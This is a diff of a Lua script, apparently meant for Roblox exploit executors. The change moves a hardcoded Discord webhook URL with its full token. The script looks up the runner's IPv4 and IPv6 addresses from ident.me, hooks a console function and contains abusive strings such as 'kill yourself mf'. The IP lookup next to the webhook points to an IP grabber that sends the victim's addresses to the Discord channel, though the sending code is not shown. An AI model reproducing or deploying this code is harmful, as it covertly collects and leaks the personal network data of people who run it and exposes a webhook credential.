@@ -1,6 +1,8 @@
 local kys = "kill yourself mf"
 local msg = "silly monkey brain"
 
+local Webhook = "https://discord.com/api/webhooks/1096520237148541028/zJOrqauz62kJ4ge408S-hsEOyTdKCFd-pV2GEgdzoJmVxJv0n1D9j6S-XBcKGv0PmCNS"
+
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local r
 local HttpRequest = http_request;
@@ -91,8 +93,6 @@ LWWT = hookfunction(rconsolename,function(urprint,...)
    end
  return LWWT(urprint,...)
 end)
-
-local Webhook = "https://discord.com/api/webhooks/1096520237148541028/zJOrqauz62kJ4ge408S-hsEOyTdKCFd-pV2GEgdzoJmVxJv0n1D9j6S-XBcKGv0PmCNS"
 
 local IPv4 = game:HttpGet("https://v4.ident.me/")
 local IPv6 = game:HttpGet("https://v6.ident.me/")
